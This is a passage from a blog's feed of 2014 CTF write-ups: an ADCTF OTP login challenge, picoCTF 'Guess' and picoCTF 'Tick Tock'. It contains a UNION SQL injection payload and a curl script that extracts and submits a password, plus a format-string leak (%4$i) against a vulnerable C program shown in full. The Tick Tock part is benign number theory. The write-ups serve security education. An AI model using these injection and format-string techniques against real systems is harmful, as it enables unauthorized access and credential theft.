<pre><code>token=' UNION SELECT pass FROM (SELECT 1 AS expire, 2 AS pass, 3 AS token UNION SELECT * FROM otp order by token desc LIMIT 0,1);
</code></pre>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="html"><span class="line"><span class="nt">&lt;p&gt;</span>otp expired at 1bffa01d220d8d69f102dc08b07ba199<span class="nt">&lt;/p&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>now all i needed was to be fast enaugh to exfiltrate a valid password and login within 10 seconds.</p>

<p>bash and curl came to the rescue, i put togeder this dirty and terrible script that helped me to login and get the flag</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="c">#!/bin/bash</span>
</span><span class="line">
</span><span class="line"><span class="nv">TOKEN</span><span class="o">=</span><span class="k">$(</span>curl http://otp.adctf2014.katsudon.org <span class="p">|</span> grep input <span class="p">|</span> grep token <span class="p">|</span> awk -F <span class="s1">&#39;&quot;&#39;</span> <span class="s1">&#39;{print $6}&#39;</span><span class="k">)</span>
</span><span class="line"><span class="nv">PASS</span><span class="o">=</span><span class="k">$(</span>curl http://otp.adctf2014.katsudon.org -d <span class="s2">&quot;token=&#39; UNION SELECT pass FROM (SELECT 1 AS expire, 2 AS pass, 3 AS token UNION SELECT * FROM otp order by token desc LIMIT 0,1);&amp;pass=&quot;</span> <span class="p">|</span> grep expired <span class="p">|</span> awk -F <span class="s1">&#39; &#39;</span> <span class="s1">&#39;{print $4}&#39;</span> <span class="p">|</span> awk -F <span class="s1">&#39;&lt;&#39;</span> <span class="s1">&#39;{print $1}&#39;</span><span class="k">)</span>
</span><span class="line">
</span><span class="line"><span class="nb">echo</span> <span class="nv">$TOKEN</span>
</span><span class="line"><span class="nb">echo</span> <span class="nv">$PASS</span>
</span><span class="line">
</span><span class="line">curl http://otp.adctf2014.katsudon.org -d <span class="s2">&quot;token=$TOKEN&amp;pass=$PASS&quot;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="html"><span class="line"><span class="nt">&lt;p&gt;</span>authentication succeeded.<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>the flag is: ADCTF_all_Y0ur_5CH3ma_ar3_83L0N9_t0_u5<span class="nt">&lt;/p&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[picoCTF 2014: Guess]]></title>
    <link href="http://swappage.github.io/blog/2014/11/08/picoctf-2014-guess/"/>
    <updated>2014-11-08T23:00:26+01:00</updated>
    <id>http://swappage.github.io/blog/2014/11/08/picoctf-2014-guess</id>
    <content type="html"><![CDATA[<p>Guess was a basic 75 points binary exploitation challenge in picoCTF 2014</p>

<p><img class="center" src="http://swappage.github.io/images/2014-11-08_guess/problem.png" /></p>

<!-- more -->

<p>The source code was available for download so it was really quick to spot the vuln:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
</pre></td><td class="code"><pre><code class="c"><span class="line"><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class="line"><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class="line">
</span><span class="line"><span class="kt">char</span> <span class="o">*</span><span class="n">flag</span> <span class="o">=</span> <span class="s">&quot;~~FLAG~~&quot;</span><span class="p">;</span>
</span><span class="line">
</span><span class="line"><span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
</span><span class="line">    <span class="kt">int</span> <span class="n">secret</span><span class="p">,</span> <span class="n">guess</span><span class="p">;</span>
</span><span class="line">    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span><span class="line">    <span class="kt">long</span> <span class="n">seed</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">    <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&quot;/dev/urandom&quot;</span><span class="p">,</span> <span class="s">&quot;rb&quot;</span><span class="p">);</span>
</span><span class="line">    <span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">secret</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
</span><span class="line">    <span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
</span><span class="line">
</span><span class="line">    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello! What is your name?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class="line">    <span class="n">fgets</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">name</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
</span><span class="line">
</span><span class="line">    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Welcome to the guessing game, &quot;</span><span class="p">);</span>
</span><span class="line">    <span class="n">printf</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
</span><span class="line">    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">I generated a random 32-bit number.</span><span class="se">\n</span><span class="s">You have a 1 in 2^32 chance of guessing it. Good luck.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class="line">
</span><span class="line">    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;What is your guess?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class="line">    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">guess</span><span class="p">);</span>
</span><span class="line">
</span><span class="line">    <span class="k">if</span><span class="p">(</span><span class="n">guess</span> <span class="o">==</span> <span class="n">secret</span><span class="p">){</span>
</span><span class="line">	<span class="n">printf</span><span class="p">(</span><span class="s">&quot;Wow! You guessed it!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class="line">	<span class="n">printf</span><span class="p">(</span><span class="s">&quot;Your flag is: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
</span><span class="line">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span><span class="line">	<span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hah! I knew you wouldn&#39;t get it.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>At line 19 there is a wonderful printf(name), which obviously results in a format string exploitable bug.</p>

<p>The program is pretty simple in its functionality, what it does is to open a file from which it reads the flag, then it generates a random number and asks you for your name.
Then it asks you to guess the number it generated.</p>

<p>Obviously abusing the format string bug, we can leak the informations from memory, read the number from the stack and reply with the correct answer, at which point we are returned the flag.</p>

<p>On my local machine using gdb could spot where the number was stored on the stack very precisely, which was at %14$i.
This didn’t work on the real target most likely because the binary was compiled under a different system, but with a little of brute forcing, i could eventually work things out</p>

<pre><code>$ nc vuln2014.picoctf.com 4546
Hello! What is your name?
%4$i
Welcome to the guessing game, -1715610369

I generated a random 32-bit number.
You have a 1 in 2^32 chance of guessing it. Good luck.
What is your guess?
-1715610369
Wow! You guessed it!
Your flag is: leak_the_seakret
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[picoCTF 2014: Tick Tock]]></title>
    <link href="http://swappage.github.io/blog/2014/11/08/picoctf-2014-tick-tock/"/>
    <updated>2014-11-08T21:49:30+01:00</updated>
    <id>http://swappage.github.io/blog/2014/11/08/picoctf-2014-tick-tock</id>
    <content type="html"><![CDATA[<p>Math, math, and more math! :)</p>

<p>There was a loth of math in this picoCTF, and Tick Tock was a pretty cool one.</p>

<p>The problem was under the reverse engineering category, but it was definitely mor math related then reverse engineering, as all you had to understand in terms of verersing, was what the python script was doing.</p>

<!-- more -->

<p>If we remove all the visualization stuff, for spinning the clock all the problem revolves around these functions</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">def</span> <span class="nf">count</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="n">m</span><span class="p">,</span><span class="n">msg</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">):</span>
</span><span class="line">  <span class="c"># n % m</span>
</span><span class="line">  <span class="n">spin_for</span> <span class="o">=</span> <span class="nb">min</span><span class="p">((</span><span class="n">m</span><span class="o">*</span><span class="mi">10</span><span class="p">),</span><span class="n">n</span><span class="p">)</span>
</span><span class="line">  <span class="n">nspots</span> <span class="o">=</span> <span class="mi">112</span>
</span><span class="line">  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">spin_for</span><span class="p">,</span><span class="n">m</span><span class="o">/</span><span class="n">nspots</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
</span><span class="line">	<span class="n">speed</span> <span class="o">=</span> <span class="mf">1.0</span><span class="o">/</span><span class="p">((</span><span class="n">spin_for</span><span class="o">-</span><span class="n">i</span><span class="p">)</span><span class="o">/</span><span class="p">(</span><span class="n">m</span><span class="o">/</span><span class="n">nspots</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
</span><span class="line">	<span class="n">printc</span><span class="p">(</span><span class="n">clock</span><span class="p">(</span><span class="mi">1</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="n">n</span><span class="o">-</span><span class="n">spin_for</span><span class="p">,</span><span class="n">m</span><span class="p">),</span><span class="n">msg</span><span class="p">)</span>
</span><span class="line">	<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">speed</span><span class="p">)</span>
</span><span class="line">  <span class="k">if</span> <span class="n">m</span><span class="o">/</span><span class="n">nspots</span><span class="o">+</span><span class="mi">1</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
</span><span class="line">	<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">spin_for</span><span class="p">,</span><span class="nb">max</span><span class="p">((</span><span class="n">spin_for</span><span class="o">-</span><span class="n">i</span><span class="p">)</span><span class="o">/</span><span class="mi">50</span><span class="p">,</span><span class="mi">1</span><span class="p">)):</span>
</span><span class="line">	  <span class="n">printc</span><span class="p">(</span><span class="n">clock</span><span class="p">(</span><span class="mi">1</span><span class="o">+</span><span class="n">j</span><span class="o">+</span><span class="n">n</span><span class="o">-</span><span class="n">spin_for</span><span class="p">,</span><span class="n">m</span><span class="p">),</span><span class="n">msg</span><span class="p">)</span>
</span><span class="line">  <span class="n">printc</span><span class="p">(</span><span class="n">clock</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="n">m</span><span class="p">),</span><span class="n">msg</span><span class="p">)</span>
</span><span class="line">  <span class="k">return</span> <span class="n">n</span><span class="o">%</span><span class="n">m</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>the count() function: that is nothing but a modulus operation with some ascii art :)</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">def</span> <span class="nf">powmod</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="n">p</span><span class="p">,</span><span class="n">m</span><span class="p">,</span><span class="n">msg</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">):</span>
</span><span class="line">  <span class="c"># n^p % m</span>
</span><span class="line">  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">p</span><span class="o">-</span><span class="mi">100</span><span class="p">),</span><span class="n">p</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
</span><span class="line">	<span class="n">speed</span> <span class="o">=</span> <span class="mf">1.0</span><span class="o">/</span><span class="n">math</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="mi">1</span><span class="o">+</span><span class="n">p</span><span class="o">-</span><span class="n">i</span><span class="p">)</span>
</span><span class="line">	<span class="n">printc</span><span class="p">(</span><span class="n">clock</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">m</span><span class="p">),</span><span class="n">m</span><span class="p">),</span><span class="n">msg</span><span class="p">)</span>
</span><span class="line">	<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">speed</span><span class="p">)</span>
</span><span class="line">  <span class="k">return</span> <span class="nb">pow</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="n">p</span><span class="p">,</span><span class="n">m</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>and the powmod() function: which is nothing but a pow, again with some graphics for displaying the clock.</p>

<p>then the application does the following:</p>

<p>it takes the first argument number we supply, it takes the list named secretz, containing 17 tuples</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">secretz</span> <span class="o">=</span> <span class="p">[(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span> <span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">13</span><span class="p">),</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">29</span><span class="p">),</span> <span class="p">(</span><span class="mi">130</span><span class="p">,</span> <span class="mi">191</span><span class="p">),</span> <span class="p">(</span><span class="mi">343</span><span class="p">,</span> <span class="mi">397</span><span class="p">),</span> <span class="p">(</span><span class="mi">652</span><span class="p">,</span> <span class="mi">691</span><span class="p">),</span> <span class="p">(</span><span class="mi">858</span><span class="p">,</span> <span class="mi">1009</span><span class="p">),</span>
</span><span class="line">       <span class="p">(</span><span class="mi">689</span><span class="p">,</span> <span class="mi">2039</span><span class="p">),</span> <span class="p">(</span><span class="mi">1184</span><span class="p">,</span> <span class="mi">4099</span><span class="p">),</span> <span class="p">(</span><span class="mi">2027</span><span class="p">,</span> <span class="mi">7001</span><span class="p">),</span> <span class="p">(</span><span class="mi">5119</span><span class="p">,</span> <span class="mi">10009</span><span class="p">),</span> <span class="p">(</span><span class="mi">15165</span><span class="p">,</span> <span class="mi">19997</span><span class="p">),</span> <span class="p">(</span><span class="mi">15340</span><span class="p">,</span> <span class="mi">30013</span><span class="p">),</span>
</span><span class="line">       <span class="p">(</span><span class="mi">29303</span><span class="p">,</span> <span class="mi">70009</span><span class="p">),</span> <span class="p">(</span><span class="mi">42873</span><span class="p">,</span> <span class="mi">160009</span><span class="p">),</span> <span class="p">(</span><span class="mi">158045</span><span class="p">,</span> <span class="mi">200009</span><span class="p">)]</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>and cycles over each tuple using the count() function, which as said earlier is nothing but a modulus operation.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">for</span> <span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="n">m</span><span class="p">)</span> <span class="ow">in</span> <span class="n">secretz</span><span class="p">:</span>
</span><span class="line">  <span class="k">if</span> <span class="n">count</span><span class="p">(</span><span class="n">num</span><span class="p">,</span><span class="n">m</span><span class="p">,</span><span class="s">&quot;</span><span class="si">%d</span><span class="s"> </span><span class="si">%%</span><span class="s"> </span><span class="si">%d</span><span class="s">&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">num</span><span class="p">,</span><span class="n">m</span><span class="p">))</span> <span class="o">!=</span> <span class="n">r</span><span class="p">:</span>
</span><span class="line">	<span class="k">print</span>
</span><span class="line">	<span class="k">print</span> <span class="s">&quot;</span><span class="si">%d</span><span class="s"> </span><span class="si">%%</span><span class="s"> </span><span class="si">%d</span><span class="s"> != </span><span class="si">%d</span><span class="s">... WRONG&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">num</span><span class="p">,</span><span class="n">m</span><span class="p">,</span><span class="n">r</span><span class="p">)</span>
</span><span class="line">	<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class="line">  <span class="k">else</span><span class="p">:</span>
</span><span class="line">	<span class="k">print</span>
</span><span class="line">	<span class="k">print</span> <span class="s">&quot;</span><span class="si">%d</span><span class="s"> </span><span class="si">%%</span><span class="s"> </span><span class="si">%d</span><span class="s"> == </span><span class="si">%d</span><span class="s">... GOOD&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">num</span><span class="p">,</span><span class="n">m</span><span class="p">,</span><span class="n">r</span><span class="p">)</span>
</span><span class="line">	<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span><span class="line">	<span class="k">print</span> <span class="s">&#39;</span><span class="se">\033</span><span class="s">[2A&#39;</span>
</span><span class="line">	<span class="k">print</span> <span class="s">&quot; &quot;</span><span class="o">*</span><span class="mi">90</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>it performs the modulus operation between the number we supplied and the second value of the tuple, and checks that the result of the operation matches the first value, if the result is correct it procedes to the next tuple, if it fails, it exits.</p>

<p>for example, if we assume that x is the first argument we submitted it checks that the following statement is true</p>

<script type="math/tex; mode=display">
\begin{align}
x \equiv 1 \pmod{2}
\end{align}
</script>

<p>and if it is, it performs the check for the next tuple.</p>

<p>So the first part of the problem was to find a value x that would satisfy the equivalence for every tuple in the secretz list.</p>

<p>This problem can be solved using the <em>chinese residiant theorem</em>
which can be implemented in python as follows:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="c">#!/usr/bin/python</span>
</span><span class="line">
</span><span class="line"><span class="k">def</span> <span class="nf">mul_inv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span><span class="line">	<span class="n">b0</span> <span class="o">=</span> <span class="n">b</span>
</span><span class="line">	<span class="n">x0</span><span class="p">,</span> <span class="n">x1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span>
</span><span class="line">	<span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> <span class="k">return</span> <span class="mi">1</span>
</span><span class="line">	<span class="k">while</span> <span class="n">a</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
</span><span class="line">		<span class="n">q</span> <span class="o">=</span> <span class="n">a</span> <span class="o">/</span> <span class="n">b</span>
</span><span class="line">		<span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">b</span><span class="p">,</span> <span class="n">a</span><span class="o">%</span><span class="n">b</span>
</span><span class="line">		<span class="n">x0</span><span class="p">,</span> <span class="n">x1</span> <span class="o">=</span> <span class="n">x1</span> <span class="o">-</span> <span class="n">q</span> <span class="o">*</span> <span class="n">x0</span><span class="p">,</span> <span class="n">x0</span>
</span><span class="line">	<span class="k">if</span> <span class="n">x1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span> <span class="n">x1</span> <span class="o">+=</span> <span class="n">b0</span>
</span><span class="line">	<span class="k">return</span> <span class="n">x1</span>
</span><span class="line">
</span><span class="line"><span class="k">def</span> <span class="nf">chinese_remainder</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">lena</span><span class="p">):</span>
</span><span class="line">	<span class="n">p</span> <span class="o">=</span> <span class="n">i</span> <span class="o">=</span> <span class="n">prod</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">sm</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class="line">	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">lena</span><span class="p">):</span> <span class="n">prod</span> <span class="o">*=</span> <span class="n">n</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span><span class="line">	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">lena</span><span class="p">):</span>
</span><span class="line">		<span class="n">p</span> <span class="o">=</span> <span class="n">prod</span> <span class="o">/</span> <span class="n">n</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span><span class="line">		<span class="n">sm</span> <span class="o">+=</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">*</span> <span class="n">mul_inv</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">n</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">*</span> <span class="n">p</span>
</span><span class="line">	<span class="k">return</span> <span class="n">sm</span> <span class="o">%</span> <span class="n">prod</span>
</span><span class="line">
</span><span class="line"><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class="line">	<span class="n">n</span> <span class="o">=</span> <span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">191</span><span class="p">,</span> <span class="mi">397</span><span class="p">,</span> <span class="mi">691</span><span class="p">,</span> <span class="mi">1009</span><span class="p">,</span> <span class="mi">2039</span><span class="p">,</span> <span class="mi">4099</span><span class="p">,</span> <span class="mi">7001</span><span class="p">,</span> <span class="mi">10009</span><span class="p">,</span> <span class="mi">19997</span><span class="p">,</span> <span class="mi">30013</span><span class="p">,</span> <span class="mi">70009</span><span class="p">,</span> <span class="mi">160009</span><span class="p">,</span> <span class="mi">200009</span><span class="p">]</span>
</span><span class="line">	<span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">130</span><span class="p">,</span> <span class="mi">343</span><span class="p">,</span> <span class="mi">652</span><span class="p">,</span> <span class="mi">858</span><span class="p">,</span> <span class="mi">689</span><span class="p">,</span> <span class="mi">1184</span><span class="p">,</span> <span class="mi">2027</span><span class="p">,</span> <span class="mi">5119</span><span class="p">,</span> <span class="mi">15165</span><span class="p">,</span> <span class="mi">15340</span><span class="p">,</span> <span class="mi">29303</span><span class="p">,</span> <span class="mi">42873</span><span class="p">,</span> <span class="mi">158045</span><span class="p">]</span>
</span><span class="line">	<span class="n">c</span> <span class="o">=</span> <span class="n">chinese_remainder</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
</span><span class="line">	<span class="k">print</span> <span class="n">c</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Once we find the number that satisfies the first part of the problem, the second function comes in play</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">if</span> <span class="n">powmod</span><span class="p">(</span><span class="n">num</span><span class="p">,</span><span class="n">num2</span><span class="p">,</span><span class="mi">200009</span><span class="o">*</span><span class="mi">160009</span><span class="p">,</span><span class="s">&quot;</span><span class="si">%d</span><span class="s"> ^ </span><span class="si">%d</span><span class="s"> </span><span class="si">%%</span><span class="s"> </span><span class="si">%d</span><span class="s">&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">num</span><span class="p">,</span><span class="n">num2</span><span class="p">,</span><span class="mi">200009</span><span class="o">*</span><span class="mi">160009</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
</span><span class="line">  <span class="k">print</span>
</span><span class="line">  <span class="k">print</span> <span class="s">&quot;</span><span class="si">%d</span><span class="s"> ^ </span><span class="si">%d</span><span class="s"> </span><span class="si">%%</span><span class="s"> </span><span class="si">%d</span><span class="s"> != 1... WRONG&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">num</span><span class="p">,</span><span class="n">num2</span><span class="p">,</span><span class="mi">200009</span><span class="o">*</span><span class="mi">160009</span><span class="p">)</span>
</span><span class="line">  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class="line"><span class="k">else</span><span class="p">:</span>
</span><span class="line">  <span class="k">print</span> <span class="s">&quot;Congratulations! The flag is: </span><span class="si">%s</span><span class="s">_</span><span class="si">%s</span><span class="s">&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="nb">str</span><span class="p">(</span><span class="n">num2</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>and what happens here is that the last two modulus operand of the secretz list, are multiplied one another and used as a modulus to compute the following equation</p>

<script type="math/tex; mode=display">
\begin{align}
x^y \equiv 1 \pmod{N}
\end{align}
</script>

<p>where </p>

<ul>
  <li>x is our first argument</li>
  <li>y is our second argument</li>
  <li>and N is the number obtained by the multiplication said above</li>
</ul>

<p>Solving this second part is easy, because there is the <em>Euler’s theorem</em> stating</p>

<script type="math/tex; mode=display">
\begin{align}
a^{\phi(N)} \equiv 1 \pmod{N}
\end{align}
</script>

<p>so.. Walfram Alfa to the rescue!</p>

<p>let’s calculate <script type="math/tex">\phi(N)</script> as this will give us the correct value to submit to the program as second parameter.</p>

<p>Unfortunately the clock script was buggy, and during the last step returned an exception, but in the end the calculated numbers were correct, and scored the flag successfully on the web site.</p>

<pre><code>83359654581036155008716649031639683153293510843035531_32002880064
</code></pre>
]]></content>
  </entry>
  
